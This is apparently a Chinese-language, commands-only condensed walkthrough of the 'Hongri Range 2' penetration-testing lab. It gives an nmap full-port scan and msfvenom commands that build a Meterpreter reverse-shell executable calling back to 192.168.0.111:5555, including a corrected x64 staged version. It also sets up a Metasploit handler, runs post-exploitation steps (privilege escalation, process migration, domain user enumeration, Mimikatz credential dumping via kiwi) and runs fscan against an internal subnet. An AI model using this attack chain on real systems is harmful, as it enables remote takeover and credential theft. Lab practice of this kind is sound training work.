# 红日靶场 2 纯命令版

> 来源：<https://mp.weixin.qq.com/s/h81Wy0gQclGB8BgA764PxA>
>
> 只保留原文中的命令和必要的修正命令，每组附一句话说明。

## 1. 端口扫描

```bash
nmap -sT --min-rate 10000 -p- -Pn 192.168.0.80
```

扫描 Web / WebLogic 主机的全部 TCP 端口。

## 2. 生成 Payload

原文命令：

```bash
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.0.111 lport=5555 -f exe -o shell.exe
```

生成 x86 stageless Meterpreter，但原文 Handler 使用了 x64 staged，二者不匹配。

修正后的 x64 staged 命令：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  lhost=192.168.0.111 lport=5555 \
  -f exe -o shell.exe
```

生成与下面 Handler 匹配的 x64 staged Meterpreter。

## 3. MSF Handler

原文命令：

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
run
```

修正后的完整 Handler：

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
set ExitOnSession false
run -j
```

监听 `192.168.0.111:5555` 并接收 Meterpreter 会话。

## 4. 后渗透

```text
getsystem
```

尝试将当前 Meterpreter 提升到 SYSTEM，原文中该操作超时。

```text
ps
migrate 500
```

查看进程并迁移到 64 位进程，`500` 需要按实际环境替换。

```cmd
net user /domain
```

枚举域用户和域信息。

```text
load kiwi
creds_all
```

加载 Mimikatz 并枚举凭据。

## 5. fscan

原文只说明上传并运行 `fscan`，没有给出参数：

```powershell
fscan.exe
```

实际使用时需要补充目标网段，例如：

```powershell
fscan.exe -h 10.10.10.0/24
```
